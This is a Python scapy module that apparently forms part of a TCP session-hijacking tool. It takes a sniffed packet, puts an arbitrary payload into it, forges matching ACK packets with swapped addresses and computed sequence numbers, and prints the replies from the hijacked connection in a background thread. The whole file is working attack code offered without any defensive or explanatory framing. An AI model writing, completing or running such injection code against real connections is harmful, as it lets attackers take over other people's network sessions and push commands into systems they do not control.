from scapy.all import *
from libs import sniffer 

kill_switch = False

def create_psh(payload):
    injection_packet = sniffer.injection_packet
    injection_packet.load = payload
    del injection_packet.len
    del injection_packet.options
    del injection_packet.chksum
    del injection_packet[TCP].chksum
    return injection_packet

def create_ack(psh):
    ip_layer = IP(src=psh[IP].dst, dst=psh[IP].src)
    tcp_layer = TCP(dport=psh[TCP].sport, sport=psh[TCP].dport, flags='A', seq=psh[TCP].ack, ack=psh[TCP].seq + len(psh[TCP].load))
    ack_resp = ip_layer/tcp_layer
    return ack_resp

def send(pkt):
    sendp(pkt, verbose=False)

def receive():
    def receive_thread():
        while True:
            current_response = sniffer.current_response
            while sniffer.current_response == current_response and not kill_switch:
                time.sleep(0.1)
            current_response = sniffer.current_response
            if kill_switch:
                return
            print(current_response.load.decode(), end="")
    threading.Thread(target=receive_thread).start()